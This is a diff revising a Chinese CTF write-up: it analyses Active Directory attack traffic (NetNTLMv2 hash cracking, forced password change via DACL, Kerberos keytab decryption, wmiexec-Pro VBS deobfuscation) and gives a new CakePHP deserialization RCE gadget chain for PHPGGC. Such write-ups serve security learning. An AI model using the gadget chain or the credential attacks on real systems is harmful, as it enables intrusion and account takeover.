@@ -17,19 +17,19 @@ tocOpen: true
 
 ### SharpADWS
 
-分析[@whoami](https://whoamianony.top/) 师傅工具 SharpADWS 在流量侧 表现
+分析 [@whoami](https://whoamianony.top/) 的 SharpADWS 工具在流量中的表现。
 
-参考演讲稿，又是膜拜学习的一天啊
+相关演讲资料：
 
-https://xz.aliyun.com/t/16378?time\_\_1311\=GuD%3D0KAKBIPGx0Heeu4QuEWDRQT5v6%3DAox
+[SharpADWS 流量分析参考文章](https://xz.aliyun.com/t/16378)
 
 ![SU_AD 流量分析截图 1](figure-01.png)
 
 ![SU_AD 流量分析截图 2](figure-02.png)
 
-使用了NetNTLMv2 协议 进行认证，尝试爆破sk用户的密码，可以参考2024强网杯的谍影重重
+流量使用 NetNTLMv2 协议认证，可以尝试恢复 `sk` 用户的密码；相关思路可参考 2024 强网杯的「谍影重重」。
 
-```Bash
+```bash
 $ tshark -n -r adws-1.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.ntresponse
 Warning: program compiled against libxml 212 using older 209
 sk      sk.com  0233f3f42302daa392aee9bb52a6887c        0233f3f42302daa392aee9bb52a6887c01010000000000003c313dc4b762db01592cc51070da966d000000000200040053004b00010004004400430004000c0073006b002e0063006f006d0003001200440043002e0073006b002e0063006f006d0005000c0073006b002e0063006f006d00070008003c313dc4b762db0106000400020000000800300030000000000000000100000000200000a6b014bf8a1f09368502041ded7fceb82c8ed41c09c2d199ee04b8421f0b0e9c0a001000000000000000000000000000000000000900160068006f00730074002f0073006b002e0063006f006d000000000000000000
@@ -45,11 +45,11 @@ $ hashcat -a 0 -m 5600 D:\Projects\MyCTFProjects\SU_AD\ntlm_hash.txt D:\Tools\Wo
 Eminem01
 ```
 
-制作keytab，可以参考[PTS2023-Talk-20-Decrypt_Kerberos_NTLM_with_Wireshark.pdf](https://archives.pass-the-salt.org/Pass%20the%20SALT/2023/slides/PTS2023-Talk-20-Decrypt_Kerberos_NTLM_with_Wireshark.pdf)
+接着制作 keytab，可参考 [Decrypt Kerberos and NTLM with Wireshark](https://archives.pass-the-salt.org/Pass%20the%20SALT/2023/slides/PTS2023-Talk-20-Decrypt_Kerberos_NTLM_with_Wireshark.pdf)。
 
 ![SU_AD 流量分析截图 3](figure-03.png)
 
-```Python
+```python
 from struct import unpack, pack
 from impacket.structure import Structure
 import binascii
@@ -194,19 +194,19 @@ else:
 
 ![SU_AD 流量分析截图 4](figure-04.png)
 
-熟悉 DACL 滥用的师傅们都知道，这是个强制改密的操作，可以参考https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
+这是一次利用 DACL 权限强制修改密码的操作，可参考 [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)。
 
 ![SU_AD 流量分析截图 5](figure-05.png)
 
-参考bloodyAD项目，其实就是替换了关键属性unicodePwd的值
+参考 bloodyAD 的实现，本质上是修改 `unicodePwd` 属性的值。
 
-PS：
+需要说明的是：
 
-在 SharpADWS 项目中 不存在 强制改密的操作，我手动实现了一个
+SharpADWS 项目本身没有这个强制改密操作，此处是我手动实现的。
 
 ![SU_AD 流量分析截图 6](figure-06.png)
 
-至此获得administrator 密码 1202)78M5CcE\=+!2
+至此获得 `administrator` 密码 `1202)78M5CcE=+!2`。
 
 ![SU_AD 流量分析截图 7](figure-07.png)
 
@@ -214,13 +214,13 @@ PS：
 
 Impacket 我只能说伟大，无需多言！
 
-不过我这里的psexec 脚本产生的smb流量，都是通过kerberos 协议认证过的，建议参考 [微软官方文档](https://learn.microsoft.com/en-us/archive/blogs/openspecification/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys) ，获知kerberos 和 ntlm 身份认证协议 在 smb3 协议上的不同
+这里的 PsExec 脚本产生的 SMB 流量通过 Kerberos 认证。有关 Kerberos 与 NTLM 在 SMB 3 中的区别，可以参考 [Microsoft 的 SMB 签名与加密密钥说明](https://learn.microsoft.com/en-us/archive/blogs/openspecification/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys)。
 
 ![SU_AD 流量分析截图 8](figure-08.png)
 
-继续制作keytab，用如下脚本生成administrator 用户 的 AES-256 密钥，主要参考[impacket脚本](https://github.com/fortra/impacket/blob/bfa7b939f8af47d4205531eddf0d5696be655d88/impacket/krb5/kerberosv5.py#L260)
+继续制作 keytab。下面的脚本生成 `administrator` 用户的 AES-256 密钥，主要参考 [Impacket 的 Kerberos 实现](https://github.com/fortra/impacket/blob/bfa7b939f8af47d4205531eddf0d5696be655d88/impacket/krb5/kerberosv5.py#L260)。
 
-```Python
+```python
 import random
 
 from impacket.krb5.crypto import _enctype_table
@@ -243,7 +243,7 @@ if __name__ == '__main__':
 
 ![SU_AD 流量分析截图 10](figure-10.png)
 
-此时终于能看见ServiceSessionKey了，但wireshark 并没有实现kerbeeros 认证下的 smb 流量自动解密，需要手动添加解开
+此时可以看到 `ServiceSessionKey`，但 Wireshark 无法自动解密这里的 Kerberos 认证 SMB 流量，需要手动添加密钥。
 
 ![SU_AD 流量分析截图 11](figure-11.png)
 
@@ -255,19 +255,19 @@ if __name__ == '__main__':
 
 ### wmiexec-Pro
 
-强烈推荐wmiexec-Pro ，横向移动绕过杀软，非常好使！！！
+接下来分析 wmiexec-Pro 产生的横向移动流量。
 
-这里分析它如何执行命令的，可以清晰看到是通过WMI 事件订阅远程执行VBS脚本，此时VBS 脚本还没有进行混淆t
+从流量可以看到，它通过 WMI 事件订阅远程执行 VBS 脚本；下图中的脚本尚未混淆。
 
 ![SU_AD 流量分析截图 15](figure-15.png)
 
-通过generator 函数 进行 混淆
+脚本通过 `generator` 函数混淆。
 
 ![SU_AD 流量分析截图 16](figure-16.png)
 
 将[混淆字符串](wmi-obfuscated.txt)下载到脚本所在目录，再运行以下脚本恢复 VBS 原文：
 
-```Python
+```python
 # 假设初始化的字符串
 from pathlib import Path
 DgtsBdJtEpjIlKMcvpKuMkflhSPGhjk = Path("wmi-obfuscated.txt").read_text().strip()
@@ -290,15 +290,15 @@ print(PFdUCUBuebAkdpolqLKtaWRPdRgMinr)
 
 ![SU_AD 流量分析截图 18](figure-18.png)
 
-用之前制作好的keytab，就可以解密流量
+使用之前制作的 keytab 解密流量。
 
 ![SU_AD 流量分析截图 19](figure-19.png)
 
-获得密码解开压缩包即可获得FLAG
+获得密码后，解开压缩包即可取得 Flag。
 
 ![SU_AD 流量分析截图 20](figure-20.png)
 
-最后感谢[@whoami](https://whoamianony.top/) 和 [@eson](https://eson.ninja/) 在我学习域渗透的时候给予的帮助
+感谢 [@whoami](https://whoamianony.top/) 和 [@eson](https://eson.ninja/) 在我学习域渗透时给予的帮助。
 
 ## SU_POP
 
@@ -308,17 +308,17 @@ print(PFdUCUBuebAkdpolqLKtaWRPdRgMinr)
 
 析构时，未处理的 `RejectedPromise` 会把 `reason` 拼进错误信息，触发 `Pool::__toString()`。后者遍历 `packages` 时，`MapReduce::getIterator()` 执行 mapper，最终以数组的值和键作为回调参数。题目中的对象由反序列化恢复，因此可以设置这些属性并绕过正常构造函数的参数约束。
 
-想出个框架的POP链挖掘的题，就打开PHPGGC 发现cakephp 好久没更新，就顺手挖一下
+想出一道框架 POP 链挖掘题时，我发现 PHPGGC 中的 CakePHP 链很久没有更新，于是尝试寻找新的利用链。
 
-我看了一下大家的WP，入口点都是一样的RejectedPromise class
+比赛后看了其他题解，发现大家选用的入口都是 `RejectedPromise` 类。
 
-在这里我也贴一下自己的payload
+下面是我使用的 Payload。
 
 参考：[CakePHP POP 链分析](https://forum.butian.net/share/2411)
 
 下面两段分别是 PHPGGC 的链定义和用于生成序列化对象的类桩，需放入 PHPGGC 对应的 gadget 目录中使用。
 
-```PHP
+```php
 <?php
 
 namespace GadgetChain\CakePHP;
@@ -341,7 +341,7 @@ class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 }
 ```
 
-```PHP
+```php
 <?php
 
 namespace Seld\Signal {
